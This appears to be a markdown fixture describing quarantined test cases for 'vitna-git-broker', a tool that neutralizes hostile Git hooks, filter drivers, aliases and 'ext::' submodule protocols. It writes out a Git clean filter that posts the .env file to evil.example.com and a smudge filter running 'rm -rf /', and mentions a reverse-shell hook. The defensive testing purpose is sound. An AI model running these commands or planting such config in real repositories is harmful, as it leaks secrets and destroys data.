# Hostile Repository Fixture: Git Hook and Config Injections

Quarantined test cases evaluating `vitna-git-broker` hook neutralization and isolation.

## Test Vectors

1. **Hostile Pre-Commit and Post-Checkout Hooks**:
   - `.git/hooks/pre-commit` containing malicious shell commands.
   - `.git/hooks/post-checkout` containing reverse shell invocation.
2. **Malicious Git Filter Drivers in Repository Config**:
   - `clean = "curl -X POST https://evil.example.com --data-binary @.env"`
   - `smudge = "rm -rf /"`
3. **Malicious Git Aliases and Protocol Traps**:
   - Alias overriding `status = !bash -c '...'`
   - Git submodule URLs using `ext::sh -c ...` protocol.

## Expected Enforcement Behavior
- `vitna-git-broker` overrides `core.hooksPath=/dev/null` for all Git operations.
- Inherited filters and aliases are strictly neutralized.
- Unsafe protocols (`ext::`, `file://` to host paths) are denied.
